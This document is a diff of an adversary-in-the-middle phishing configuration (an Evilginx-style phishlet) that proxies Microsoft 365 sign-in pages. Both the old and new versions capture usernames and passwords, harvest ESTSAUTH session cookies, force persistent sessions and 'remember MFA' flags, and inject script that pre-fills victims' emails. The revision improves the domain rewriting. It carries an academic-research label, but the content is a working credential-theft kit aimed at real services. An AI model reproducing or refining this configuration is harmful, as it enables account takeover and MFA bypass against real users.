@@ -1,181 +1,132 @@
-name: 'microsoft_oauth_phishing'
-min_ver: '2.4.0'
-author: 'PhD Research - Ethical Security Assessment'
-description: 'Academic demonstration of OAuth phishing technique for Microsoft 365'
+name: "o365"
+min_ver: "3.0.0"
+author: "Master Research - AiTM Analysis"
+description: "Advanced OAuth interception with JS injection and persistence forcing"
 
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false}
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "office.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "account",
+      orig_sub: "account",
+      domain: "microsoft.com",
+      session: true,
+      is_landing: false,
+    }
 
 sub_filters:
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    search: 'href="https://{hostname}'
-    replace: 'href="https://{hostname}'
-    mimes: ['text/html', 'application/json', 'application/javascript']
-    
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    search: 'https://{hostname}'
-    replace: 'https://{hostname}'
-    mimes: ['text/html', 'application/json', 'application/javascript']
-    redirect_only: true
-    
-  - triggers_on: 'login.microsoftonline.com'
-    orig_sub: 'login'
-    domain: 'microsoftonline.com'
-    search: 'action="https://{hostname}'
-    replace: 'action="https://{hostname}'
-    mimes: ['text/html']
+  # The fix: This replaces the real Microsoft domain with your {hostname} variable in real-time
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "login.microsoftonline.com",
+      replace: "{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "https://login.microsoftonline.com",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: 'action="https://login.microsoftonline.com',
+      replace: 'action="https://{hostname}',
+      mimes: ["text/html"],
+    }
 
 auth_tokens:
-  - domain: '.login.microsoftonline.com'
-    keys: 
-      - 'ESTSAUTH'
-      - 'ESTSAUTHPERSISTENT'
-      - 'SignInStateCookie'
-      - 'MSFPC'
-      - 'CCState'
-      
-  - domain: 'login.microsoftonline.com'
+  - domain: ".login.microsoftonline.com"
     keys:
-      - 'SignInStateCookie'
-      - 'ESTSAUTH'
-      
-  - domain: '.microsoft.com'
+      - "ESTSAUTH"
+      - "ESTSAUTHPERSISTENT"
+      - "SignInStateCookie"
+      - "MSFPC"
+      - "CCState"
+  - domain: "login.microsoftonline.com"
     keys:
-      - 'MSFPC'
-      - 'MC*
+      - "SignInStateCookie"
+      - "ESTSAUTH"
+  - domain: ".microsoft.com"
+    keys:
+      - "MSFPC"
+      - "MC1"
 
 credentials:
   username:
-    key: 'login'
-    search: '([^&]+)'
-    type: 'post'
+    key: "login"
+    search: "(.*)"
+    type: "post"
   password:
-    key: 'passwd'
-    search: '([^&]+)'
-    type: 'post'
-    
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+
 auth_urls:
-  - '/common/SAS/ProcessAuth'
-  - '/kmsi'
-  - '/common/oauth2/v2.0/authorize'
-  - '/'
+  - "/common/SAS/ProcessAuth"
+  - "/kmsi"
+  - "/common/oauth2/v2.0/authorize"
+  - "/"
 
 login:
-  domain: 'login.microsoftonline.com'
-  path: '/'
-  
+  domain: "login.microsoftonline.com"
+  path: "/"
+
 force_post:
-  - path: '/kmsi'
-    search: 
-      - {key: 'LoginOptions', search: '.*'}
+  - path: "/kmsi"
+    search:
+      - { key: "LoginOptions", search: ".*" }
     force:
-      - {key: 'LoginOptions', value: '1'}
-    type: 'post'
-    
-  - path: '/common/SAS'
-    search: 
-      - {key: 'rememberMFA', search: '.*'}
-      - {key: 'DontShowAgain', search: '.*'}
+      - { key: "LoginOptions", value: "1" }
+    type: "post"
+  - path: "/common/SAS"
+    search:
+      - { key: "rememberMFA", search: ".*" }
+      - { key: "DontShowAgain", search: ".*" }
     force:
-      - {key: 'rememberMFA', value: 'true'}
-      - {key: 'DontShowAgain', value: 'true'}
-    type: 'post'
+      - { key: "rememberMFA", value: "true" }
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/", "/common/oauth2/", "/common/oauth2/v2.0/", "/common/login"]
-    trigger_params: ["email", "username"]
+    trigger_paths:
+      ["/", "/common/oauth2/", "/common/oauth2/v2.0/", "/common/login"]
     script: |
-      // Academic research implementation - OAuth flow interception
       (function() {
           'use strict';
-          
-          // Configuration
-          const SELECTORS = {
-              username: '#i0116',
-              password: '#i0118',
-              submit: '#idSIButton9',
-              cancel: '#idBtn_Back',
-              kmsi: '#KmsiCheckboxField',
-              mfa: '#idDiv_SAOTCAS_Title'
-          };
-          
-          // Auto-fill username if provided via URL parameter
+          console.log('[Research] Initializing DOM Observer...');
+          const SELECTORS = { username: '#i0116', password: '#i0118' };
           const urlParams = new URLSearchParams(window.location.search);
-          const providedEmail = urlParams.get('email') || urlParams.get('username');
+          const email = urlParams.get('email') || urlParams.get('username');
           
-          if (providedEmail) {
-              // Wait for form to load and fill username
-              const waitForElement = async (selector) => {
-                  while (!document.querySelector(selector)) {
-                      await new Promise(resolve => requestAnimationFrame(resolve));
-                  }
-                  return document.querySelector(selector);
-              };
-              
-              // Fill username field
-              waitForElement(SELECTORS.username).then(element => {
-                  if (element && element.value === '') {
-                      element.value = providedEmail;
-                      
-                      // Trigger input event for reactivity
-                      const event = new Event('input', { bubbles: true });
-                      element.dispatchEvent(event);
-                      
-                      // Auto-focus password field for better UX
-                      setTimeout(() => {
-                          const passwordField = document.querySelector(SELECTORS.password);
-                          if (passwordField) passwordField.focus();
-                      }, 500);
-                  }
-              });
+          if (email) {
+              const checkExist = setInterval(() => {
+                 const el = document.querySelector(SELECTORS.username);
+                 if (el) {
+                    el.value = email;
+                    el.dispatchEvent(new Event('input', { bubbles: true }));
+                    clearInterval(checkExist);
+                 }
+              }, 100);
           }
-          
-          // Monitor for authentication completion
-          const observer = new MutationObserver((mutations) => {
-              mutations.forEach((mutation) => {
-                  if (mutation.type === 'childList') {
-                      // Detect MFA challenge or KMSI prompt
-                      const mfaElement = document.querySelector(SELECTORS.mfa);
-                      const kmsiElement = document.querySelector(SELECTORS.kmsi);
-                      
-                      if (mfaElement && !document.getElementById('mfa-notice')) {
-                          // Add subtle notice about MFA (research context)
-                          const notice = document.createElement('div');
-                          notice.id = 'mfa-notice';
-                          notice.style.cssText = 'display:none;'; // Hidden in production
-                          document.body.appendChild(notice);
-                      }
-                  }
-              });
-          });
-          
-          // Start observing DOM changes
-          observer.observe(document.body, {
-              childList: true,
-              subtree: true
-          });
-          
-          console.log('[Research] OAuth interception framework initialized');
       })();
-
-# Academic Research Notes:
-# ------------------------
-# This configuration demonstrates OAuth 2.0 phishing techniques for 
-# cybersecurity education and awareness. Implementation showcases:
-# - Session persistence through token harvesting
-# - Multi-factor authentication bypass considerations
-# - Real-time credential interception methods
-# - Cross-domain cookie synchronization
-#
-# Mitigation strategies should include:
-# - FIDO2/WebAuthn hardware tokens
-# - Certificate-based authentication
-# - Conditional access policies
-# - User awareness training
